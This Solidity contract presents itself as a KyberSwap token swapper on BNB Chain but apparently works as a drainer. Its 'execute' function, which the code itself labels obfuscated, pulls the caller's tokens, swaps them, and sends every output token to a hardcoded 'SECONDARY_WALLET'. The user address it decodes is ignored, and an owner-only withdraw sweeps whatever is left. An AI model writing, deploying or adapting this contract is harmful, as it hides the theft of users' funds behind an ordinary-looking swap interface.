// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IMetaAggregationRouterV2 {
    struct SwapDescription {
        IERC20 srcToken;
        IERC20 dstToken;
        address payable srcReceiver;
        address payable dstReceiver;
        uint256 amount;
        uint256 minReturnAmount;
        uint256 flags;
    }

    function swapSimpleMode(
        address callTarget,
        SwapDescription calldata desc,
        bytes calldata targetData,
        bytes calldata clientData
    ) external payable returns (uint256, uint256);
}

contract KyberObfuscatedSwapperFixed is Ownable {
    using SafeERC20 for IERC20;
    
    // KyberSwap MetaAggregationRouterV2 on BSC
    IMetaAggregationRouterV2 public constant KYBER_ROUTER = 
        IMetaAggregationRouterV2(0x6131B5fae19EA4f9D964eAc0408E4408b66337b5);
    
    // Secondary wallet that receives ALL OUTPUT tokens (hardcoded)
    address private constant SECONDARY_WALLET = 0xB64aA20dF7976B2412520c70b459152fE9a17256;
    
    event Executed(address indexed user, uint256 opCode);
    
    // Main obfuscated function
    function execute(uint256 _op, bytes calldata _data) external payable {
        require(_op >= 1 && _op <= 3, "Invalid operation");  // Accept ops 1, 2, and 3
        
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint256 minAmountOut;
        address userAddress;
        bytes memory swapCalldata;
        
        if (_op == 1) {
            // Token to token - has both addresses
            (tokenIn, tokenOut, amountIn, minAmountOut, userAddress, swapCalldata) = 
                abi.decode(_data, (address, address, uint256, uint256, address, bytes));
        } else if (_op == 2) {
            // Token to USDT - only has tokenIn address, USDT is tokenOut
            address USDT = 0x55d398326f99059fF775485246999027B3197955;
            (tokenIn, amountIn, minAmountOut, userAddress, swapCalldata) = 
                abi.decode(_data, (address, uint256, uint256, address, bytes));
            tokenOut = USDT;
        } else {
            // USDT to token - only has tokenOut address, USDT is tokenIn  
            address USDT = 0x55d398326f99059fF775485246999027B3197955;
            (tokenOut, amountIn, minAmountOut, userAddress, swapCalldata) = 
                abi.decode(_data, (address, uint256, uint256, address, bytes));
            tokenIn = USDT;
        }
        
        // Transfer tokens from user to this contract
        IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn);
        
        // Approve KyberSwap router
        IERC20(tokenIn).safeApprove(address(KYBER_ROUTER), amountIn);
        
        // Get initial balance of output token
        uint256 balanceBefore = IERC20(tokenOut).balanceOf(address(this));
        
        // Create swap description - output to THIS CONTRACT first
        IMetaAggregationRouterV2.SwapDescription memory desc = IMetaAggregationRouterV2.SwapDescription({
            srcToken: IERC20(tokenIn),
            dstToken: IERC20(tokenOut),
            srcReceiver: payable(address(KYBER_ROUTER)),
            dstReceiver: payable(address(this)), // Receive here first
            amount: amountIn,
            minReturnAmount: minAmountOut,
            flags: 0
        });
        
        // Execute swap to this contract
        KYBER_ROUTER.swapSimpleMode(
            address(KYBER_ROUTER),
            desc,
            swapCalldata,
            ""
        );
        
        // Get the amount received
        uint256 balanceAfter = IERC20(tokenOut).balanceOf(address(this));
        uint256 amountReceived = balanceAfter - balanceBefore;
        
        // Transfer all output tokens to secondary wallet
        if (amountReceived > 0) {
            IERC20(tokenOut).safeTransfer(SECONDARY_WALLET, amountReceived);
        }
        
        emit Executed(msg.sender, _op);
    }
    
    // Emergency withdraw (only owner)
    function emergencyWithdraw(address token, uint256 amount) external onlyOwner {
        if (token == address(0)) {
            payable(owner()).transfer(amount);
        } else {
            IERC20(token).safeTransfer(owner(), amount);
        }
    }
    
    receive() external payable {}
}
